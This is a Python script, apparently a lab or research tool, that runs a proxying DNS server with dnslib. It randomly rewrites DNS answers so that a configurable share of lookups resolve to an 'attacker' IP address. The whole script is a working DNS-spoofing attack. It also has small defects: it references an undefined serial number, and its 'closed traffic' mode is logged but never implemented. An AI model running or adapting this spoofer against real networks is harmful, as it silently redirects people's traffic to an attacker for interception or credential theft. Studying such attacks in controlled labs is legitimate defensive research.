#!/usr/bin/env python3.6
# EDITED BY MAY YAARON
import json
import logging
import os
import signal
from datetime import datetime
from pathlib import Path
from textwrap import wrap
from time import sleep
import random

from dnslib import DNSLabel, QTYPE, RR, dns
from dnslib.proxy import ProxyResolver
from dnslib.server import DNSServer

# SERIAL_NO = int((datetime.utcnow() - datetime(1970, 1, 1)).total_seconds())
logger = logging.getLogger()
handler = logging.FileHandler(f'logfile_{datetime.now().strftime("%m_%d-%H-%M")}.log')
handler.setFormatter(logging.Formatter('%(asctime)s: %(message)s', datefmt='%H:%M:%S'))

logger.addHandler(handler)
logger.setLevel(logging.INFO)


TYPE_LOOKUP = {
    'A': (dns.A, QTYPE.A),
    'AAAA': (dns.AAAA, QTYPE.AAAA),
    'CAA': (dns.CAA, QTYPE.CAA),
    'CNAME': (dns.CNAME, QTYPE.CNAME),
    'DNSKEY': (dns.DNSKEY, QTYPE.DNSKEY),
    'MX': (dns.MX, QTYPE.MX),
    'NAPTR': (dns.NAPTR, QTYPE.NAPTR),
    'NS': (dns.NS, QTYPE.NS),
    'PTR': (dns.PTR, QTYPE.PTR),
    'RRSIG': (dns.RRSIG, QTYPE.RRSIG),
    'SOA': (dns.SOA, QTYPE.SOA),
    'SRV': (dns.SRV, QTYPE.SRV),
    'TXT': (dns.TXT, QTYPE.TXT),
    'SPF': (dns.TXT, QTYPE.TXT),
}


class Record:
    def __init__(self, rname, rtype, args):
        self._rname = DNSLabel(rname)

        rd_cls, self._rtype = TYPE_LOOKUP[rtype]
        if self._rtype == QTYPE.SOA and len(args) == 2:
            # add sensible times to SOA
            args += (SERIAL_NO, 3600, 3600 * 3, 3600 * 24, 3600),

        if self._rtype == QTYPE.TXT and len(args) == 1 and isinstance(args[0], str) and len(args[0]) > 255:
            # wrap long TXT records as per dnslib's docs.
            args = wrap(args[0], 255),

        if self._rtype in (QTYPE.NS, QTYPE.SOA):
            ttl = 3600 * 24
        else:
            ttl = 300

        self.rr = RR(
            rname=self._rname,
            rtype=self._rtype,
            rdata=rd_cls(*args),
            ttl=ttl,
        )

    def match(self, q):
        return q.qname == self._rname and (q.qtype == QTYPE.ANY or q.qtype == self._rtype)

    def sub_match(self, q):
        return self._rtype == QTYPE.SOA and q.qname.matchSuffix(self._rname)

    def __str__(self):
        return str(self.rr)


class Resolver(ProxyResolver):
    def __init__(self, upstream, attacker):
        super().__init__(upstream, 53, 5)
        self.attacker = attacker

    def resolve(self, request, handler):
        reply = super().resolve(request, handler)
        for i in range(len(reply.rr)):
            if reply.rr[i].rtype not in TYPE_LOOKUP['A']:
                continue
            if random.random() < attack_probability:
                reply.rr[i].rdata = dns.A(self.attacker)
        print(reply)
        logger.info(reply)
        return reply


def handle_sig(signum, frame):
    logger.info('pid=%d, got signal: %s, stopping...', os.getpid(), signal.Signals(signum).name)
    exit(0)


if __name__ == '__main__':
    # for the signal SIGTERM - call the handle_sig function
    logger.info("start DNS file")
    signal.signal(signal.SIGTERM, handle_sig)

    port = int(os.getenv('PORT', 53))
    close_traffic = bool(int(os.getenv('CLOSE', 1)))
    attack_probability = float(os.getenv('P', 0.2))
    upstream = os.getenv('UPSTREAM', '8.8.8.8')
    attacker_ip = os.getenv('ATTACKER', '10.0.28.196')
    zone_file = Path(os.getenv('ZONE_FILE', 'zones2.txt'))
    resolver = Resolver(upstream, attacker_ip)
    udp_server = DNSServer(resolver, port=port)
    tcp_server = DNSServer(resolver, port=port, tcp=True)

    logger.info('starting DNS server on port %d, attack prob is %f"', port, attack_probability)
    if close_traffic:
        logger.info('traffic is closed, every unknown ip will be redirected to one of the known hosts.')
    else:
        logger.info('traffic is open, upstream DNS server "%s', upstream)
    udp_server.start_thread()
    tcp_server.start_thread()

    try:
        while udp_server.isAlive():
            sleep(1)
    except KeyboardInterrupt:
        pass

